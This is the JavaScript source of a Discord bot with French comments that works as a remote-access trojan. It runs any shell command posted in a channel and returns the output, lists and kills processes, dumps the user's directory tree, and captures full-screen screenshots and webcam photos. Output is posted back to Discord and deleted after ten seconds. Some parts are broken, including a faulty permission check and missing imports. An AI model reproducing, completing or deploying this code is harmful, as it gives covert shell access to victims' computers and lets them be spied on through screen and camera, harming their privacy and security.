const { Client, Intents } = require('discord.js');
const { exec } = require('child_process');
const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES] });
const fs = require('fs');
const prefix = '+';
const cmdChannelId = 'ID DU SALON OU LA COMMAND SERA EXECUTER';
const outputChannelId = 'ID DU SALON OU CERA RENVOYER LES REPONSES DU TERMINAL';
const MAX_MESSAGE_LENGTH = 1990;
client.once('ready', () => {
    console.log('Bot is ready!');
});

client.on('messageCreate', async (message) => {
  if (!message.content.startsWith(prefix) || message.author.bot) return;

  const args = message.content.slice(prefix.length).trim().split(/ +/);
  const command = args.shift().toLowerCase();

  if (command === 'cmd') {
      if (message.channel.id !== cmdChannelId) return; // Only allow the command in a specific channel

      const cmdContent = args.join(' ');

      exec(cmdContent, (error, stdout, stderr) => {
          const output = `${stdout}${stderr}`;

          sendOutputInChunks(output);
          if (error) {
              console.error(`Error executing command: ${error}`);
          }
      });
  } else if (command === 'task') {
      if (message.channel.id !== cmdChannelId) return; // Only allow the command in a specific channel

      exec('tasklist', (error, stdout, stderr) => {
          const output = `${stdout}${stderr}`;

          sendOutputInChunks(output);
          if (error) {
              console.error(`Error executing command: ${error}`);
          }
      });
  } else if (command === 'back') {
      if (message.channel.id !== cmdChannelId) return; // Only allow the command in a specific channel

      exec('tasklist /v', (error, stdout, stderr) => {
          const output = `${stdout}${stderr}`;

          sendOutputInChunks(output);
          if (error) {
              console.error(`Error executing command: ${error}`);
          }
      });
  } else if (command === 'rmtask') {
      if (message.channel.id !== cmdChannelId) return; // Only allow the command in a specific channel

      const taskName = args.join(' ');

      exec(`taskkill /IM ${taskName}`, (error, stdout, stderr) => {
          const output = `${stdout}${stderr}`;

          sendOutputInChunks(output);
          if (error) {
              console.error(`Error executing command: ${error}`);
          }
      });
  } else if (command === 'tree') {
      if (message.channel.id !== cmdChannelId) return; // Only allow the command in a specific channel

      exec('tree /A /F /F %USERPROFILE%', (error, stdout, stderr) => {
          const output = `${stdout}${stderr}`;

          sendOutputInChunks(output);
          if (error) {
              console.error(`Error executing command: ${error}`);
          }
      });
  }
});

function sendOutputInChunks(output) {
  const outputChannel = client.channels.cache.get(outputChannelId);
  if (!outputChannel || !outputChannel.isText()) return;

  const chunks = splitIntoChunks(output, MAX_MESSAGE_LENGTH);
  for (const chunk of chunks) {
      outputChannel.send(`\`\`\`${chunk}\`\`\``).then((msg) => {
          setTimeout(() => {
              msg.delete();
          }, 10000);
      });
  }
}

function splitIntoChunks(text, chunkSize) {
  const chunks = [];
  for (let i = 0; i < text.length; i += chunkSize) {
      chunks.push(text.substring(i, i + chunkSize));
  }
  return chunks;
}
      
client.on('messageCreate', msg => {
    if (msg.content === 'screenshot') {
      if (msg.author.id === '919241062181126174', '') {
        msg.reply("Vous n'êtes pas autorisé à utiliser cette commande.");
        return;
      }
      // Prendre une capture d'écran en utilisant la commande système appropriée
      exec('nircmd.exe savescreenshotfull screen.png', (err, stdout, stderr) => {
        if (err) {
          console.error(err);
          return;
        }
        // Envoyer l'image capturée dans le même salon Discord
        msg.reply({
          files: [
            {
              attachment: './screen.png',
              name: 'screen.png'
            }
          ]
        }).then(() => {
          // Supprimer le fichier après l'avoir envoyé
          fs.unlink('./screen.png', (err) => {
            if (err) {
              console.error(err);
              return;
            }
            console.log('Le fichier a été supprimé');
          });
        }).catch(console.error);
      });
    }
  });

  const NodeWebcam = require('node-webcam')

  const webcam = NodeWebcam.create({
    width: 1280,
    height: 720,
    quality: 100,
    delay: 0,
    saveShots: false,
    output: "png",
    callbackReturn: "location"
  });

  const webcamConfig = {
    width: 1280,
    height: 720,
    quality: 100,
    delay: 0,
    saveShots: true,
    output: 'jpeg',
    device: false,
    callbackReturn: 'buffer',
  };
  
  client.on('messageCreate', async (msg) => {
    if (msg.content.startsWith('cam')) {
      // Extraction du texte à ajouter sur l'image
      const textToAdd = msg.content.slice(1);
  
      // Capture de la photo avec la webcam
      webcam.capture('photo', async (err, data) => {
        if (err) {
          console.error(err);
          return;
        }
  
        // Chargement de l'image capturée dans Canvas
        const canvas = createCanvas(webcamConfig.width, webcamConfig.height);
        const ctx = canvas.getContext('2d');
        const image = await loadImage(data);
        ctx.drawImage(image, 0, 0, canvas.width, canvas.height);
  
        // Ajout du texte sur l'image avec Canva
        ctx.font = 'bold 36px sans-serif';
        ctx.fillStyle = 'white';
        ctx.fillText(textToAdd, 50, 100);
  
        // Récupération de l'image modifiée
        const finalImageData = canvas.toBuffer();
  
        // Envoi de l'image dans un message Discord
        const attachment = new MessageAttachment(finalImageData, 'photo.png');
        const embed = new MessageEmbed()
          .setColor('#0099ff')
          .setTitle('Photo avec la caméra')
          .setImage(`attachment://${attachment.name}`);
  
        msg.channel.send({ files: [attachment], embeds: [embed] })
          .catch(console.error);
      });
    }
      
  });
    


// Replace 'YOUR_DISCORD_TOKEN' with your actual Discord bot token
client.login('YOUR_DISCORD_TOKEN');
